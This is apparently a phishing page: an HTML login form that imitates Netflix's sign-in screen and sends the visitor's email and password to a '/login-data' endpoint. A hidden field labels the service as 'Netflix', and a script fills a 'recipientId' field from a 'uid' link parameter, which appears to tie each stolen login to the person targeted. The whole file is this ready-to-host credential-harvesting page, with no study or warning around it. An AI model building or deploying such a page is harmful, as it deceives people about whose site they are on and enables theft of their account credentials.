<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Netflix</title>
    <style>
        body, html { background: #141414; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100%; box-sizing: border-box; }
        .login-body { background: #000; width: 100%; max-width: 450px; padding: 40px; }
        h1 { font-size: 32px; font-weight: bold; margin-bottom: 28px; }
        .input-field { position: relative; margin-bottom: 16px; }
        input { width: 100%; height: 50px; background: #333; border-radius: 4px; border: 0; color: #fff; padding: 16px 20px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 16px; background: #e50914; border: 0; border-radius: 4px; font-size: 16px; font-weight: bold; color: #fff; cursor: pointer; margin-top: 24px; }
    </style>
</head>
<body>
    <div class="login-body">
        <h1>Sign In</h1>
        <form action="/login-data" method="post">
            <div class="input-field">
                <input type="text" name="username" placeholder="Email or phone number" required autocapitalize="none">
            </div>
            <div class="input-field">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <input type="hidden" name="service" value="Netflix">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Sign In</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
